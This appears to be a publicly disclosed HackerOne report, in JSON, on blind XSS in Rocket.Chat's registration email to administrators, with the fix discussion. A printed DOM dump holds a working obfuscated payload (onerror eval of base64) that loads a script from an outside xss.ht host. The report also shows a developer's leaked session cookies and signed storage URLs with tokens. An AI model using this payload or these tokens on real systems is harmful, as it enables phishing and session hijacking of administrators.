{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-08-27T18:34:37.481Z", 
    "voters": [
        "europa", 
        "003random", 
        "emitrani", 
        "eveeez", 
        "khalidamin", 
        "babayaga_", 
        "mygf", 
        "micr0", 
        "asad_anwar", 
        "cryptographer", 
        "and 3 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 382666, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Blind XSS in the rocket.chat registration email", 
    "is_member_of_team?": null, 
    "vote_count": 13, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-09-26T18:34:37.640Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "attachments": [
        {
            "file_name": "image.png", 
            "type": "image/png", 
            "id": 321540, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/321/540/0eea7b1d0f10af3a2809b9ee757ca6a7ac31f02c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221630Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=125ce0e7d1c9990830ae55d689880f0e94f4a1a5a432a920cdbb286d6f12ba13"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-07-18T09:13:32.157Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-18T09:13:32.157Z", 
            "actor": {
                "username": "frdmn", 
                "url": "/frdmn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/278/911/e96bbcd218212e5e7095ec03e2ca25a263c0f158_medium.jpg?1526626426"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "Hi Ed,\n\nthanks for reaching out and reporting this to us in such a detailed manner.\n\nI'm going to contact our developers to see who can take a look at this.\n\nBest regards.\nJonas", 
            "markdown_message": "<p>Hi Ed,</p>\n\n<p>thanks for reaching out and reporting this to us in such a detailed manner.</p>\n\n<p>I&#39;m going to contact our developers to see who can take a look at this.</p>\n\n<p>Best regards.<br>\nJonas</p>\n", 
            "type": "Activities::Comment", 
            "id": 3060877, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-19T20:44:54.989Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-19T20:44:54.989Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow can you explain me how this could be exploited since it's an email and would be rendered by the email client?", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> can you explain me how this could be exploited since it&#39;s an email and would be rendered by the email client?</p>\n", 
            "type": "Activities::Comment", 
            "id": 3070343, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-21T18:57:24.385Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-21T18:58:10.517Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "Hi @rodrigok,\n\nI totally see what you mean, it is definitely confusing referring to this as \"XSS\" in the context of an email client. That being said, as an adversary, being able to control the contents of an email's HTML body coming from a trusted source \u2014 particularly important since that will evade any spam filters \u2014 means that I can easily trick a Rocket.chat administrator. One could inject tracking code \u2014 as demonstrated with the HTML5 canvas screenshot of the email \u2014 and malicious links inside of the email body.\n\nPersonally, if I were in the position of an administrator, I would not want my users to be able to control the HTML contents of an email body being sent to my inbox from what appears to be Rocket.chat. Especially when the email's purpose it to be reviewed by the administrator.\n\nTo summarise, I would probably classify this as a viable means of phishing that is probably far more convincing than your bog-standard phishing email.\n\nI hope that clears things up. Please let me know if you need any further information.\n\n\\- Ed", 
            "markdown_message": "<p>Hi <a href=\"/rodrigok\">@rodrigok</a>,</p>\n\n<p>I totally see what you mean, it is definitely confusing referring to this as &quot;XSS&quot; in the context of an email client. That being said, as an adversary, being able to control the contents of an email&#39;s HTML body coming from a trusted source \u2014 particularly important since that will evade any spam filters \u2014 means that I can easily trick a Rocket.chat administrator. One could inject tracking code \u2014 as demonstrated with the HTML5 canvas screenshot of the email \u2014 and malicious links inside of the email body.</p>\n\n<p>Personally, if I were in the position of an administrator, I would not want my users to be able to control the HTML contents of an email body being sent to my inbox from what appears to be Rocket.chat. Especially when the email&#39;s purpose it to be reviewed by the administrator.</p>\n\n<p>To summarise, I would probably classify this as a viable means of phishing that is probably far more convincing than your bog-standard phishing email.</p>\n\n<p>I hope that clears things up. Please let me know if you need any further information.</p>\n\n<p>- Ed</p>\n", 
            "type": "Activities::Comment", 
            "id": 3080115, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-25T21:43:36.400Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-25T21:43:36.400Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow thanks, that clarify the issue, we will add this to our development board and will update the status soon.\n\nThanks", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> thanks, that clarify the issue, we will add this to our development board and will update the status soon.</p>\n\n<p>Thanks</p>\n", 
            "type": "Activities::Comment", 
            "id": 3098704, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-25T21:44:12.600Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-25T21:44:12.600Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "Blind XSS in the rocket.chat registration email", 
                "old_title": "Blind XSS in the rocket.chat Android client."
            }, 
            "team_handle": "rocket_chat", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 3098709, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-02T12:44:59.458Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-02T12:44:59.458Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow here is the Pull Request fixing the issue https://github.com/RocketChat/Rocket.Chat/pull/11644", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> here is the Pull Request fixing the issue <a title=\"https://github.com/RocketChat/Rocket.Chat/pull/11644\" href=\"/redirect?signature=85db4295b64df558b144ad732bdaf8528bf6d810&amp;url=https%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat%2Fpull%2F11644\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/RocketChat/Rocket.Chat/pull/11644</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 3132250, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-02T16:31:29.428Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-02T16:31:29.428Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "Hi @rodrigok,\n\nNice work! It looks like you have covered all the cases where user input is sent via email in that pull request.\n\n\\- Ed", 
            "markdown_message": "<p>Hi <a href=\"/rodrigok\">@rodrigok</a>,</p>\n\n<p>Nice work! It looks like you have covered all the cases where user input is sent via email in that pull request.</p>\n\n<p>- Ed</p>\n", 
            "type": "Activities::Comment", 
            "id": 3133186, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-08-24T13:44:52.159Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-24T13:44:52.159Z", 
            "actor": {
                "username": "rodrigok", 
                "url": "/rodrigok", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/360/4dbc387389e3a267a73b03aec224ba4d3acad0b4_medium.jpg?1491842972"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "@edoverflow can you test using our release candidate version? https://www.npmjs.com/package/dompurifyhttps://github.com/RocketChat/Rocket.Chat/releases/tag/0.69.0-rc.0", 
            "markdown_message": "<p><a href=\"/edoverflow\">@edoverflow</a> can you test using our release candidate version? <a title=\"https://www.npmjs.com/package/dompurifyhttps://github.com/RocketChat/Rocket.Chat/releases/tag/0.69.0-rc.0\" href=\"/redirect?signature=2d1a4b7b2d6a9d6abdcf0e80cf2ebe4ca39a8f38&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fdompurifyhttps%3A%2F%2Fgithub.com%2FRocketChat%2FRocket.Chat%2Freleases%2Ftag%2F0.69.0-rc.0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/dompurifyhttps://github.com/RocketChat/Rocket.Chat/releases/tag/0.69.0-rc.0</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 3240317, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/337/531/6bffcecbadb1c2cd71e5ba931d90af68c28fea6b/screenshot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221630Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44979b41d9a3cddf8f94cf850f47f7414c2115945520dad5f8537cf4cdce2991", 
                    "type": "image/png", 
                    "id": 337531, 
                    "filename": "screenshot.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-08-24T22:02:39.480Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-08-24T22:02:39.480Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rocket_chat", 
            "message": "Hi @rodrigok,\n\nI will get to work on testing the new release. I would just like to point out something, it appears that one of your developers tested the vulnerability using my payload from this report. I beleive the developer is Tasso Evangelista and they might have leaked important information to me.\n\n{F337531}\n\nThe payload fired in the context of `http://0.0.0.0:1080/email/wWKkV3yh/html`, leaking the developer's IP address (`189.6.XXX.XXX`) and cookies (`rc_uid=Tdjm7ck8PvufbQEt7; rc_token=JjkVGMkpPhW91xe5bFjTpX84Fin3pq9DengXKwuBW9Z`).\n\nHere is the full DOM output:\n\n```html\n<html>\n   <head>\n      <base target=\"_blank\">\n   </head>\n   <body>\n      <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"100%\" bgcolor=\"#f3f3f3\" style=\"color:#4a4a4a;font-family: Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;border-collapse:collapse;border-spacing:0;margin:0 auto\">\n         <tbody>\n            <tr>\n               <td style=\"padding:1em\">\n                  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" width=\"100%\" style=\"width:100%;margin:0 auto;max-width:800px\">\n                     <tbody>\n                        <tr>\n                           <td bgcolor=\"#ffffff\" style=\"background-color:#ffffff; border: 1px solid #DDD; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;\">\n                              <table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n                                 <tbody>\n                                    <tr>\n                                       <td style=\"background-color: #04436a;\">\n                                          <h1 style=\"font-family: Helvetica,Arial,sans-serif; padding: 0 1em; margin: 0; line-height: 70px; color: #FFF;\">Rocket.Chat</h1>\n                                       </td>\n                                    </tr>\n                                    <tr>\n                                       <td style=\"padding: 1em; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;\">\n                                          <p>The user <b>Tasso (tasso.evangelista.3@rocket.cat)</b> has been registered.</p>\n                                          <p>Reason: <b>\"&gt;<img src=\"x\" id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\" onerror=\"eval(atob(this.id))\"></b></p>\n                                          <p>Please check \"Administration -&gt; Users\" to activate or delete it.</p>\n                                       </td>\n                                    </tr>\n                                 </tbody>\n                              </table>\n                           </td>\n                        </tr>\n                        <tr>\n                           <td border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"100%\" style=\"font-family: Helvetica,Arial,sans-serif; max-width: 800px; margin: 0 auto; padding: 1.5em; text-align: center; font-size: 8pt; color: #999;\">Powered by <a href=\"https://rocket.chat\" target=\"_blank\">Rocket.Chat</a></td>\n                        </tr>\n                     </tbody>\n                  </table>\n               </td>\n            </tr>\n         </tbody>\n      </table>\n      <script src=\"https://2973956338.xss.ht\"></script>\n   </body>\n</html>\n```\n\nWhen testing these types of issues in future, I highly recommend *not* using my personal payload. You can create an account on https://xsshunter.com/ and use your own payload. This is just to make sure you do not accidentally leak sensitive information to the reporter in future.", 
            "markdown_message": "<p>Hi <a href=\"/rodrigok\">@rodrigok</a>,</p>\n\n<p>I will get to work on testing the new release. I would just like to point out something, it appears that one of your developers tested the vulnerability using my payload from this report. I beleive the developer is Tasso Evangelista and they might have leaked important information to me.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"screenshot.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/337/531/6bffcecbadb1c2cd71e5ba931d90af68c28fea6b/screenshot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221630Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=44979b41d9a3cddf8f94cf850f47f7414c2115945520dad5f8537cf4cdce2991\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/337/531/6bffcecbadb1c2cd71e5ba931d90af68c28fea6b/screenshot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221630Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=44979b41d9a3cddf8f94cf850f47f7414c2115945520dad5f8537cf4cdce2991\" class=\"markdown-inline-image\"></a></p>\n\n<p>The payload fired in the context of <code>http://0.0.0.0:1080/email/wWKkV3yh/html</code>, leaking the developer&#39;s IP address (<code>189.6.XXX.XXX</code>) and cookies (<code>rc_uid=Tdjm7ck8PvufbQEt7; rc_token=JjkVGMkpPhW91xe5bFjTpX84Fin3pq9DengXKwuBW9Z</code>).</p>\n\n<p>Here is the full DOM output:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n   <span class=\"nt\">&lt;head&gt;</span>\n      <span class=\"nt\">&lt;base</span> <span class=\"na\">target=</span><span class=\"s\">&quot;_blank&quot;</span><span class=\"nt\">&gt;</span>\n   <span class=\"nt\">&lt;/head&gt;</span>\n   <span class=\"nt\">&lt;body&gt;</span>\n      <span class=\"nt\">&lt;table</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">bgcolor=</span><span class=\"s\">&quot;#f3f3f3&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;color:#4a4a4a;font-family: Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;border-collapse:collapse;border-spacing:0;margin:0 auto&quot;</span><span class=\"nt\">&gt;</span>\n         <span class=\"nt\">&lt;tbody&gt;</span>\n            <span class=\"nt\">&lt;tr&gt;</span>\n               <span class=\"nt\">&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;padding:1em&quot;</span><span class=\"nt\">&gt;</span>\n                  <span class=\"nt\">&lt;table</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">align=</span><span class=\"s\">&quot;center&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;width:100%;margin:0 auto;max-width:800px&quot;</span><span class=\"nt\">&gt;</span>\n                     <span class=\"nt\">&lt;tbody&gt;</span>\n                        <span class=\"nt\">&lt;tr&gt;</span>\n                           <span class=\"nt\">&lt;td</span> <span class=\"na\">bgcolor=</span><span class=\"s\">&quot;#ffffff&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;background-color:#ffffff; border: 1px solid #DDD; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;&quot;</span><span class=\"nt\">&gt;</span>\n                              <span class=\"nt\">&lt;table</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span><span class=\"nt\">&gt;</span>\n                                 <span class=\"nt\">&lt;tbody&gt;</span>\n                                    <span class=\"nt\">&lt;tr&gt;</span>\n                                       <span class=\"nt\">&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;background-color: #04436a;&quot;</span><span class=\"nt\">&gt;</span>\n                                          <span class=\"nt\">&lt;h1</span> <span class=\"na\">style=</span><span class=\"s\">&quot;font-family: Helvetica,Arial,sans-serif; padding: 0 1em; margin: 0; line-height: 70px; color: #FFF;&quot;</span><span class=\"nt\">&gt;</span>Rocket.Chat<span class=\"nt\">&lt;/h1&gt;</span>\n                                       <span class=\"nt\">&lt;/td&gt;</span>\n                                    <span class=\"nt\">&lt;/tr&gt;</span>\n                                    <span class=\"nt\">&lt;tr&gt;</span>\n                                       <span class=\"nt\">&lt;td</span> <span class=\"na\">style=</span><span class=\"s\">&quot;padding: 1em; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;&quot;</span><span class=\"nt\">&gt;</span>\n                                          <span class=\"nt\">&lt;p&gt;</span>The user <span class=\"nt\">&lt;b&gt;</span>Tasso (tasso.evangelista.3@rocket.cat)<span class=\"nt\">&lt;/b&gt;</span> has been registered.<span class=\"nt\">&lt;/p&gt;</span>\n                                          <span class=\"nt\">&lt;p&gt;</span>Reason: <span class=\"nt\">&lt;b&gt;</span>&quot;<span class=\"ni\">&amp;gt;</span><span class=\"nt\">&lt;img</span> <span class=\"na\">src=</span><span class=\"s\">&quot;x&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&quot;</span> <span class=\"na\">onerror=</span><span class=\"s\">&quot;eval(atob(this.id))&quot;</span><span class=\"nt\">&gt;&lt;/b&gt;&lt;/p&gt;</span>\n                                          <span class=\"nt\">&lt;p&gt;</span>Please check &quot;Administration -<span class=\"ni\">&amp;gt;</span> Users&quot; to activate or delete it.<span class=\"nt\">&lt;/p&gt;</span>\n                                       <span class=\"nt\">&lt;/td&gt;</span>\n                                    <span class=\"nt\">&lt;/tr&gt;</span>\n                                 <span class=\"nt\">&lt;/tbody&gt;</span>\n                              <span class=\"nt\">&lt;/table&gt;</span>\n                           <span class=\"nt\">&lt;/td&gt;</span>\n                        <span class=\"nt\">&lt;/tr&gt;</span>\n                        <span class=\"nt\">&lt;tr&gt;</span>\n                           <span class=\"nt\">&lt;td</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellspacing=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">cellpadding=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100%&quot;</span> <span class=\"na\">style=</span><span class=\"s\">&quot;font-family: Helvetica,Arial,sans-serif; max-width: 800px; margin: 0 auto; padding: 1.5em; text-align: center; font-size: 8pt; color: #999;&quot;</span><span class=\"nt\">&gt;</span>Powered by <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://rocket.chat&quot;</span> <span class=\"na\">target=</span><span class=\"s\">&quot;_blank&quot;</span><span class=\"nt\">&gt;</span>Rocket.Chat<span class=\"nt\">&lt;/a&gt;&lt;/td&gt;</span>\n                        <span class=\"nt\">&lt;/tr&gt;</span>\n                     <span class=\"nt\">&lt;/tbody&gt;</span>\n                  <span class=\"nt\">&lt;/table&gt;</span>\n               <span class=\"nt\">&lt;/td&gt;</span>\n            <span class=\"nt\">&lt;/tr&gt;</span>\n         <span class=\"nt\">&lt;/tbody&gt;</span>\n      <span class=\"nt\">&lt;/table&gt;</span>\n      <span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&quot;https://2973956338.xss.ht&quot;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n   <span class=\"nt\">&lt;/body&gt;</span>\n<span 